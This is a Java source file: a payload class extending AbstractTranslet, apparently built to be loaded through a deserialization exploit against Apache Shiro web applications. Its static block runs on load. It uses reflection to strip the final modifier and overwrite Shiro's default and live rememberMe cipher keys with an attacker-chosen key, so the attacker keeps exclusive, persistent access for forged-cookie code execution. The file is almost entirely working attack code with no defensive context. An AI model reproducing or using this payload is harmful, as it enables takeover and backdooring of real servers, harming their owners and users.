package org.sec.core;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.shiro.mgt.AbstractRememberMeManager;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.support.RequestContextUtils;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;

public class PrivateShellInject extends AbstractTranslet {
    private static final String newKey = "4ra1n_Big_HacKeR";
    static {
        try {
            // 只修改默认配置并不会生效
            Field _key = AbstractRememberMeManager.class.getDeclaredField("DEFAULT_CIPHER_KEY_BYTES");
            _key.setAccessible(true);
            Field keyModifiersField = Field.class.getDeclaredField("modifiers");
            keyModifiersField.setAccessible(true);
            keyModifiersField.setInt(_key, _key.getModifiers() & ~Modifier.FINAL);
            _key.set(null, newKey.getBytes(StandardCharsets.UTF_8));

            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(
                    ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());

            Class<?> cookieClazz = Class.forName("org.apache.shiro.web.mgt.CookieRememberMeManager");
            Object cookieManager = context.getBean(cookieClazz);

            Field _encrypt = AbstractRememberMeManager.class.getDeclaredField("encryptionCipherKey");
            _encrypt.setAccessible(true);
            _encrypt.set(cookieManager,newKey.getBytes(StandardCharsets.UTF_8));

            Field _decrypt = AbstractRememberMeManager.class.getDeclaredField("decryptionCipherKey");
            _decrypt.setAccessible(true);
            _decrypt.set(cookieManager,newKey.getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
